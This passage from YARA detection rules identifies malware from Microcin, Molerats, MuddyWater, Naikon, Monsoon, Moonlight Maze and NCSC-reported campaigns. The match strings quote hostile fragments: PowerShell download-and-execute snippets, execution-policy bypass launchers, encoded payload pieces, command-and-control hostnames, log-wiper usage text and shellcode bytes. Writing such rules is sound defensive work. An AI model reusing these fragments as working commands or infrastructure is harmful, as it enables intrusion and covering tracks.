= \"e Class Descriptor at (\" fullword ascii\n        $s2 = \".?AVCAntiAntiAppleFrameRealClass@@\" fullword ascii\n        $s3 = \".?AVCAntiAntiAppleFrameBaseClass@@\" fullword ascii\n        $s4 = \".?AVCAppleBinRealClass@@\" fullword ascii\n        $s5 = \".?AVCAppleBinBaseClass@@\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (4 of them or pe.imphash() == \"897077ca318eaf629cfe74569f10e023\"))\n}\n\nrule Microcin_Sample_2\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"[Pause]\" fullword ascii\n        $s7 = \"IconCache_%02d%02d%02d%02d%02d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule Microcin_Sample_3\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Users\\\\Lenovo\\\\Desktop\\\\test\\\\Release\\\\test.pdb\" fullword ascii\n        $s2 = \"test, Version 1.0\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule Microcin_Sample_4\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd /c dir /a /s \\\"%s\\\" > \\\"%s\\\"\" fullword wide\n        $s2 = \"ini.dat\" fullword wide\n        $s3 = \"winupdata\" fullword wide\n        $f1 = \"%s\\\\(%08x%08x)%s\" fullword wide\n        $f2 = \"%s\\\\d%08x\\\\d%08x.db\" fullword wide\n        $f3 = \"%s\\\\u%08x\\\\u%08x.db\" fullword wide\n        $f4 = \"%s\\\\h%08x\\\\h%08x.db\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of ($s*) or 5 of them)\n}\n\nrule Microcin_Sample_5\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Sorry, you are not fortuante ^_^, Please try other password dictionary \" fullword ascii\n        $x2 = \"DomCrack <IP> <UserName> <Password_Dic file path> <option>\" fullword ascii\n        $x3 = \"The password is \\\"%s\\\"         Time: %d(s)\" fullword ascii\n        $x4 = \"The password is \\\" %s \\\"         Time: %d(s)\" fullword ascii\n        $x5 = \"No password found!\" fullword ascii\n        $x7 = \"Can not found the Password Dictoonary file! \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them) or 2 of them\n}\n\nrule Microcin_Sample_6\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"** ERROR ** %s: %s\" fullword ascii\n        $s2 = \"TEMPDATA\" fullword wide\n        $s3 = \"Bruntime error \" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and all of them)\n}\n\nrule MiddleEast_Campaign_Malware_1\n{\n    meta:\n        description = \"Malware from Middle Eastern campaign reported by Talos\"\n        ref = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ME_Campaign_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and (pe.imphash() == \"618f76eaf4bd95c690d43e84d617efe9\")\n}\n\nrule MiddleEast_Campaign_Malware_2\n{\n    meta:\n        description = \"Malware from Middle Eastern campaign reported by Talos\"\n        ref = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ME_Campaign_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"QuickAssist.exe\" fullword wide\n        $s2 = \"<description>Microsoft Modern Sharing Solution</description>\" fullword ascii\n        $s3 = \"GBEWCWA\" fullword ascii\n        $s4 = \"name=\\\"QuickAssist\\\" \" fullword ascii\n        $s5 = \"Cimzal\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and (pe.imphash() == \"b06055e6cc2a804111ab6964df1ca4ae\" or 4 of them)\n}\n\nrule MiddleEast_Campaign_Malware_3\n{\n    meta:\n        description = \"Malware from Middle Eastern campaign reported by Talos\"\n        ref = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ME_Campaign_Malware_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"objWShell.Run \\\"powershell.exe -ExecutionPolicy Bypass -File \\\"\\\"%appdata%\\\"\\\"\\\\sys.ps1\\\", 0 \" fullword ascii\n        $x2 = \"objFile.WriteLine \\\"New-Item -Path \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\"\\\" -ItemType Directory -Force }\\\" \" fullword ascii\n        $x3 = \"objFile.WriteLine \\\"$path = \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\\Report.doc\\\"\\\"\\\" \" fullword ascii\n        $s4 = \"File=appData & \\\"\\\\sys.ps1\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x6553 and filesize < 400KB and 1 of them\n}\n\nrule MiddleEast_Campaign_Malware_4\n{\n    meta:\n        description = \"Malware from Middle Eastern campaign reported by Talos\"\n        ref = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ME_Campaign_Malware_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == \"fb7da233a35ac523d6059fff543627ab\"\n}\n\nrule MiddleEast_Campaign_Malware_5\n{\n    meta:\n        description = \"Malware from Middle Eastern campaign reported by Talos\"\n        ref = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ME_Campaign_Malware_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"D:\\\\me\\\\do\\\\do\\\\obj\\\\\" ascii\n        $s2 = \"Select * from Win32_ComputerSystem\" fullword wide\n        $s3 = \"Get_Antivirus\" fullword ascii\n        $s4 = \"{{\\\"id\\\":\\\"{0}\\\",\\\"user\\\":\\\"{1}\\\",\\\"path\\\":\\\"{2}\\\"}}\" fullword wide\n        $s5 = \"update software online\" fullword wide\n        $s6 = \"time.nist.gov\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and (pe.imphash() == \"f34d5f2d4577ed6d9ceec516c1f5a744\" and (8 of them)) or (all of them)\n}\n\nrule Molerats_certs\n{\n    meta:\n        description = \"Code signed with certificates used by the Molerats actor\"\n        threat_names = \"Molerats\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FireEye Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Molerats_certs\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cert1 = { 06 50 11 A5 BC BF 83 C0 93 28 16 5E 7E 85 27 75 }\n        $cert2 = { 03 e1 e1 aa a5 bc a1 9f ba 8c 42 05 8b 4a bf 28 }\n        $cert3 = { 0c c0 35 9c 9c 3c da 00 d7 e9 da 2d c6 ba 7b 6d }\n\n    condition:\n        1 of ($cert*)\n}\n\nrule Molerats_Jul17_Sample_1\n{\n    meta:\n        description = \"Molerats sample - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00\" wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule Molerats_Jul17_Sample_2\n{\n    meta:\n        description = \"Molerats sample - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Folder.exe\" fullword ascii\n        $s2 = \"Notepad++.exe\" fullword wide\n        $s3 = \"RSJLRSJOMSJ\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule Molerats_Jul17_Sample_3\n{\n    meta:\n        description = \"Molerats sample - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ccleaner.exe\" fullword wide\n        $s2 = \"Folder.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and all of them)\n}\n\nrule Molerats_Jul17_Sample_4\n{\n    meta:\n        description = \"Molerats sample - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"get-itemproperty -path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\' -name 'KeyName')\" wide\n        $x2 = \"O.Run C & chrw(34) & \\\"[System.IO.File]::\" wide\n        $x3 = \"HKCU\\\\SOFTWARE\\\\Microsoft\\\\\\\\KeyName\\\"\" fullword wide\n\n    condition:\n        (filesize < 700KB and 1 of them)\n}\n\nrule Molerats_Jul17_Sample_5\n{\n    meta:\n        description = \"Molerats sample - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"powershell.exe -nop -c \\\"iex\" nocase ascii\n        $x2 = \".run('%windir%\\\\\\\\SysWOW64\\\\\\\\WindowsPowerShell\\\\\\\\\" ascii\n        $a1 = \"Net.WebClient).DownloadString\" nocase ascii\n        $a2 = \"gist.githubusercontent.com\" nocase ascii\n\n    condition:\n        filesize < 200KB and (1 of ($x*) or 2 of them)\n}\n\nrule Molerats_Jul17_Sample_Dropper\n{\n    meta:\n        description = \"Molerats sample dropper SFX - July 2017\"\n        threat_names = \"Molerats\"\n        ref = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Molerats_Jul17_Sample_Dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Please remove %s from %s folder. It is unsecure to run %s until it is done.\" fullword wide\n        $s2 = \"sfxrar.exe\" fullword ascii\n        $s3 = \"attachment.hta\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule Monsoon_APT_Malware_1\n{\n    meta:\n        description = \"Malware from Monsoon APT\"\n        threat_names = \"Monsoon\"\n        ref = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Monsoon_APT_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c start \" fullword ascii\n        $s2 = \"\\\\Microsoft\\\\Templates\\\\\" fullword ascii\n        $s3 = \"\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"a0c824244f1d36ea1dd2759cf7599cd1\" or all of them))\n}\n\nrule Monsoon_APT_Malware_2\n{\n    meta:\n        description = \"Malware from Monsoon APT\"\n        threat_names = \"Monsoon\"\n        ref = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Monsoon_APT_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Microsoft\\\\Windows\\\\coco.exe\" fullword ascii\n        $x2 = \":\\\\System Volume Information\\\\config\" fullword ascii\n        $x3 = \" cscript.[BACKSPA[PAGE DO[CAPS LO[PAGE UPTPX498.dTPX499.d\" fullword wide\n        $s1 = \"\\\\Microsoft\\\\Templates\\\\msvcrt.dll\" fullword ascii\n        $s2 = \"%04d/%02d/%02d %02d:%02d:%02d - {%s}\" fullword wide\n        $s3 = \"wininet.dll    \" fullword ascii\n        $s4 = \"DMCZ0001.dat\" fullword ascii\n        $s5 = \"TZ0000001.dat\" fullword ascii\n        $s6 = \"\\\\MUT.dat\" fullword ascii\n        $s7 = \"ouemm/emm!!!!!!!!!!!!!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and (1 of ($x*) or 3 of them))\n}\n\nrule MoonlightMaze_IRIX_exploit_GEN\n{\n    meta:\n        description = \"Irix exploit from David Hedley used by Moonlight Maze hackers\"\n        threat_names = \"Moonlight Maze\"\n        ref = \"https://en.wikipedia.org/wiki/Moonlight_Maze, https://www.exploit-db.com/exploits/19274/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_RU_MoonlightMaze_IRIX_exploit_GEN\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"stack = 0x%x, targ_addr = 0x%x\"\n        $a2 = \"execl failed\"\n\n    condition:\n        (uint32(0) == 0x464c457f) and (all of them)\n}\n\nrule MoonlightMaze_u_logcleaner\n{\n    meta:\n        description = \"Log cleaner based on utclean.c\"\n        threat_names = \"Moonlight Maze\"\n        ref = \"https://en.wikipedia.org/wiki/Moonlight_Maze, http://cd.textfiles.com/cuteskunk/Unix-Hacking-Exploits/utclean.c\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_RU_MoonlightMaze_u_logcleaner\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"Hiding complit...n\"\n        $a2 = \"usage: %s <username> <fixthings> [hostname]\"\n        $a3 = \"ls -la %s* ; /bin/cp  ./wtmp.tmp %s; rm  ./wtmp.tmp\"\n\n    condition:\n        (uint32(0) == 0x464c457f) and (any of them)\n}\n\nrule MoonlightMaze_wipe\n{\n    meta:\n        description = \"Log cleaner based on wipe.c\"\n        threat_names = \"Moonlight Maze\"\n        ref = \"http://www.afn.org/~afn28925/wipe.c, https://en.wikipedia.org/wiki/Moonlight_Maze\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_RU_MoonlightMaze_wipe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"ERROR: Unlinking tmp WTMP file.\"\n        $a2 = \"USAGE: wipe [ u|w|l|a ] ...options...\"\n        $a3 = \"Erase acct entries on tty :   wipe a [username] [tty]\"\n        $a4 = \"Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\"\n\n    condition:\n        (uint32(0) == 0x464c457f) and (2 of them)\n}\n\nrule MuddyWater_Mal_Doc_Feb18_1\n{\n    meta:\n        description = \"Malicious document used by MuddyWater\"\n        threat_names = \"MuddyWater\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MuddyWater_Mal_Doc_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmco\" ascii\n        $x2 = \"U1FCdUFIWUFid0JyQUdVQUxRQkZBSGdBY0FCeUFHVUFjd0J6QUdrQWJ3QnVBQ0FBS\"\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 3000KB and 1 of them\n}\n\nrule MuddyWater_Mal_Doc_Feb18_2\n{\n    meta:\n        description = \"Malicious document used by MuddyWater\"\n        threat_names = \"MuddyWater\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MuddyWater_Mal_Doc_Feb18_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"*\\\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\\\Windows\\\\System32\\\\stdole2.tlb#OLE Automation\" fullword wide\n        $s2 = \"*\\\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\OFFICE16\\\\MSO.DLL#Microsoft \" wide\n        $s3 = \"*\\\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\MSWORD.OLB#Microsoft Word 16.0 O\" wide\n        $s4 = \"scripting.filesystemobject$\" fullword ascii\n        $s5 = \"ID=\\\"{00000000-0000-0000-0000-000000000000}\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 6000KB and all of them\n}\n\nrule Naikon_APT_Sample1\n{\n    meta:\n        description = \"Backdoor related to the Naikon APT\"\n        threat_names = \"Naikon\"\n        ref = \"https://goo.gl/7vHyvh\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Backdoor_Naikon_APT_Sample1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x0 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n        $x1 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n        $x2 = \"greensky27.vicp.net\" fullword ascii\n        $x3 = \"\\\\tempvxd.vxd.dll\" fullword wide\n        $x4 = \"otna.vicp.net\" fullword ascii\n        $x5 = \"smithking19.gicp.net\" fullword ascii\n        $s1 = \"User-Agent: webclient\" fullword ascii\n        $s2 = \"\\\\User.ini\" fullword ascii\n        $s3 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200\" ascii\n        $s4 = \"\\\\UserProfile.dll\" fullword wide\n        $s5 = \"Connection:Keep-Alive: %d\" fullword ascii\n        $s6 = \"Referer: http://%s:%d/\" fullword ascii\n        $s7 = \"%s %s %s %d %d %d \" fullword ascii\n        $s8 = \"%s--%s\" fullword wide\n        $s9 = \"Run File Success!\" fullword wide\n        $s10 = \"DRIVE_REMOTE\" fullword wide\n        $s11 = \"ProxyEnable\" fullword wide\n        $s12 = \"\\\\cmd.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or 7 of ($s*))\n}\n\nrule NCSCReport_Partial_Implant_ID\n{\n    meta:\n        description = \"Implant from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Partial_Implant_ID\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = {38 38 31 34 35 36 46 43}\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of ($a*)\n}\n\nrule NCSCReport_Sleep_Timer_Choice\n{\n    meta:\n        description = \"Malware from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sleep_Timer_Choice\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = {8b0424b90f00000083f9ff743499f7f98d420f}\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of ($a*)\n}\n\nrule NCSCReport_User_Function_String\n{\n    meta:\n        description = \"User function string from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"User_Function_String\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a2 = \"e.RandomHashString\"\n        $a3 = \"e.Decode\"\n        $a4 = \"e.Decrypt\"\n        $a5 = \"e.HashStr\"\n        $a6 = \"e.FromB64\"\n\n    condition:\n        4 of ($a*)\n}\n\nrule NCSCReport_generic_shellcode_downloader_specific\n{\n    meta:\n        description = \"Doorshell from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"generic_shellcode_downloader_specific\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $push1 = {68 6C 6C 6F 63}\n        $push2 = {68 75 61 6C 41}\n        $push3 = {68 56 69 72 74}\n        $a = {BA 90 02 00 00 46 C1 C6 19 03 DD 2B F4 33 DE}\n        $b = {87 C0 81 F2 D1 19 89 14 C1 C8 1F FF E0}\n\n    condition:\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3C)) == 0x4550) and ($a or $b) and @push1 < @push2 and @push2 < @push3\n}\n\nrule NCSCReport_Batch_Script_To_Run_PsExec\n{\n    meta:\n        description = \"Malicious batch file from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        